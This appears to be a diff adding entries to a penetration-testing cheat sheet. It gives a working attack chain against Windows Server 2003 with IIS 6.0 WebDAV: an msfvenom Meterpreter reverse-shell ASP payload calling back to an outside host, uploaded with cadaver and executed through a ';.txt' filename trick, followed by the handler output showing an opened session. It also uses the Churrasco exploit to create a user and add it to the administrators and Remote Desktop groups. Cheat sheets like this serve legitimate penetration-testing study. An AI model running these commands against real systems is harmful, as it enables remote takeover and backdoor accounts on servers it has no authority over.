@@ -1375,11 +1375,52 @@ Handy Kernel Exploits
 -   Metasploit Meterpreter Privilege Escalation Guide
     https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/
 
+-   Windows Server 2003 and IIS 6.0 WEBDAV Exploiting
+http://www.r00tsec.com/2011/09/exploiting-microsoft-iis-version-60.html
+
+         msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=443 -f asp > aspshell.txt
+
+         cadavar http://$ip
+         dav:/> put aspshell.txt
+         Uploading aspshell.txt to `/aspshell.txt':
+         Progress: [=============================>] 100.0% of 38468 bytes succeeded.
+         dav:/> copy aspshell.txt aspshell3.asp;.txt
+         Copying `/aspshell3.txt' to `/aspshell3.asp%3b.txt':  succeeded.
+         dav:/> exit
+
+         msf > use exploit/multi/handler
+         msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+         msf exploit(handler) > set LHOST 1.2.3.4
+         msf exploit(handler) > set LPORT 80
+         msf exploit(handler) > set ExitOnSession false
+         msf exploit(handler) > exploit -j
+
+         curl http://$ip/aspshell3.asp;.txt
+
+         [*] Started reverse TCP handler on 1.2.3.4:443 
+         [*] Starting the payload handler...
+         [*] Sending stage (957487 bytes) to 1.2.3.5
+         [*] Meterpreter session 1 opened (1.2.3.4:443 -> 1.2.3.5:1063) at 2017-09-25 13:10:55 -0700
+
 -   Windows privledge escalation exploits are often written in Python. So, it is necessary to compile the using pyinstaller.py into an executable and upload them to the remote server.
 
          pip install pyinstaller
          wget -O exploit.py <http://www.exploit-db.com/download/31853>  
          python pyinstaller.py --onefile exploit.py
+
+-   Windows Server 2003 and IIS 6.0 privledge escalation using impersonation: 
+
+      https://www.exploit-db.com/exploits/6705/
+   
+      https://github.com/Re4son/Churrasco
+      
+         c:\Inetpub>churrasco
+         churrasco
+         /churrasco/-->Usage: Churrasco.exe [-d] "command to run"
+
+         c:\Inetpub>churrasco -d "net user /add <username> <password>"
+         c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
+         c:\Inetpub>churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"
 
 -   Windows MS11-080 - http://www.exploit-db.com/exploits/18176/  
     
